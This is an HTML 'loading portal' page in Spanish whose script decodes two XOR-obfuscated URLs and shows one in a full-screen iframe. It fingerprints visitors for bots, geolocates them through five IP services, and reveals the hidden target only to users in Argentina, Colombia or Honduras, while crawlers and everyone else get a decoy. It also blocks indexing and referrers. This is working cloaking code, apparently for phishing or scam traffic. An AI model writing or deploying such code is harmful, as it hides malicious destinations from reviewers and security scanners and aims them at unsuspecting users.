
<!DOCTYPE html>
<html lang="es">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <!-- Prevención de Indexación (SEO Negativo) -->
    <meta name="robots" content="noindex, nofollow, noarchive, nosnippet">
    <meta name="referrer" content="no-referrer">

    <title>Cargando Portal...</title>

    <style>
        :root {
            --bg-color: #f8f9fa;
            --primary: #0056b3;
            --text-color: #5f6368;
        }

        body,
        html {
            margin: 0;
            padding: 0;
            width: 100vw;
            height: 100vh;
            background: var(--bg-color);
            overflow: hidden;
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
            display: flex;
            justify-content: center;
            align-items: center;
        }

        .loader-container {
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            animation: fadeIn 0.5s ease-in-out;
        }

        .spinner {
            width: 48px;
            height: 48px;
            border: 4px solid rgba(0, 86, 179, 0.1);
            border-left-color: var(--primary);
            border-radius: 50%;
            animation: spin 1s linear infinite;
            margin-bottom: 20px;
        }

        .text {
            font-size: 16px;
            color: var(--text-color);
            font-weight: 500;
            letter-spacing: 0.3px;
        }

        .full-iframe {
            position: fixed;
            top: 0;
            left: 0;
            width: 100vw;
            height: 100vh;
            border: none;
            z-index: 9999;
            opacity: 0;
            transition: opacity 0.3s ease;
        }

        .full-iframe.visible {
            opacity: 1;
        }

        @keyframes spin {
            0% {
                transform: rotate(0deg);
            }

            100% {
                transform: rotate(360deg);
            }
        }

        @keyframes fadeIn {
            from {
                opacity: 0;
            }

            to {
                opacity: 1;
            }
        }
    </style>
</head>

<body>
    <div class="loader-container">
        <div class="spinner"></div>
        <div class="text">Cargando...</div>
    </div>

    <script>
        (function () {
            // Algoritmo Decodificador (Base64 -> XOR)

            // Algoritmo Decodificador (Base64 -> XOR)
            const _k = 's3cr3tK3y!'; // Mismo key usado en convertidor.html

            const _dec = (str) => {
                try {
                    const decoded = atob(str);
                    let result = '';
                    for (let i = 0; i < decoded.length; i++) {
                        result += String.fromCharCode(decoded.charCodeAt(i) ^ _k.charCodeAt(i % _k.length));
                    }
                    return result;
                } catch (e) {
                    return '/'; // Fallback a root si falla
                }
            };

            const _cfg = {
                t: ['AR', 'CO', 'HN'],
                p1: _dec('G0cXAkBOZBwJTgNGDxNBGCRUEE9dXA0eWhouHA=='),
                p2: _dec('G0cXAkBOZBwLRABHAgdBFSVHHE0GXQJDHQ56AFdWFlFNEVwGLh0OSB1XDAVAWiVWDQ4=')
            };

            const _endpoints = [
                ['https://api.country.is/', 'country'],
                ['https://ipwho.is/', 'country_code'],
                ['https://get.geojs.io/v1/ip/country.json', 'country'],
                ['https://ipinfo.io/json', 'country'],
                ['https://freeipapi.com/api/json', 'countryCode']
            ];

            // Detección Avanzada de Bots (Fingerprinting básico)
            const _isBot = () => {
                let score = 0;

                // User Agent y WebDriver básico
                const botUa = /bot|crawler|spider|crawling|googlebot|bingbot|yandex|baiduspider|headless/i;
                if (botUa.test(navigator.userAgent) || navigator.webdriver || window.document.documentElement.getAttribute("webdriver") !== null) score += 3;

                // Headless Browser Checks
                if (navigator.plugins.length === 0 && navigator.userAgent.indexOf('Chrome') !== -1) score++; // Chrome headless suele no tener plugins
                if (screen.colorDepth < 24) score++;
                if (window.outerWidth === 0 && window.outerHeight === 0) score++; // Dimensiones 0 es sospechoso
                if (!window.chrome && navigator.userAgent.includes("Chrome")) score++; // Falsificación de Chrome

                // Herramientas de automatización inyectan variables en window
                if (window._phantom || window.__nightmare || window.navigator.webdriver) score += 2;

                return score >= 2; // Si la puntuación de bot es 2 o mayor, lo consideramos bot
            };

            const _mount = (targetUrl) => {
                // Pequeño delay de 1s para mostrar el loader
                setTimeout(() => {
                    const iframe = document.createElement('iframe');
                    iframe.className = 'full-iframe';
                    iframe.src = targetUrl;
                    iframe.setAttribute('allowfullscreen', '');
                    iframe.setAttribute('allow', 'autoplay; encrypted-media');
                    document.body.appendChild(iframe);

                    iframe.onload = () => {
                        // Ocultar el loader y mostrar el iframe
                        document.querySelector('.loader-container').style.display = 'none';
                        iframe.classList.add('visible');
                    };
                }, 1000);
            };

            const _fetchNode = async (url, prop) => {
                const controller = new AbortController();
                const timeoutId = setTimeout(() => controller.abort(), 3500);

                try {
                    const response = await fetch(url, {
                        signal: controller.signal,
                        cache: 'no-store',
                        headers: { 'Accept': 'application/json' }
                    });
                    clearTimeout(timeoutId);

                    if (!response.ok) throw new Error('ERR_RSP');

                    const data = await response.json();
                    if (data && data[prop]) return String(data[prop]).toUpperCase();

                    throw new Error('ERR_PROP');
                } catch (e) {
                    clearTimeout(timeoutId);
                    throw e;
                }
            };

            const _init = async () => {
                // 1. Detección temprana de Bots
                if (_isBot()) {
                    return _mount(_cfg.p2);
                }

                // 2. Caché de Geolocalización (Rendimiento)
                const cachedCountry = sessionStorage.getItem('_sys_cc');
                if (cachedCountry) {
                    return _mount(_cfg.t.includes(cachedCountry) ? _cfg.p1 : _cfg.p2);
                }

                // 3. Resolución de Geolocalización si no hay caché
                try {
                    const tasks = _endpoints.map(e => _fetchNode(e[0], e[1]));
                    const result = await Promise.any(tasks);

                    // Guardar en caché para futuras recargas (dura hasta cerrar pestaña)
                    sessionStorage.setItem('_sys_cc', result);

                    _mount(_cfg.t.includes(result) ? _cfg.p1 : _cfg.p2);
                } catch (err) {
                    // Fallback de seguridad
                    _mount(_cfg.p2);
                }
            };

            // Iniciar flujo
            if (document.readyState === 'loading') {
                document.addEventListener('DOMContentLoaded', _init);
            } else {
                _init();
            }
        })();
    </script>
</body>

</html>
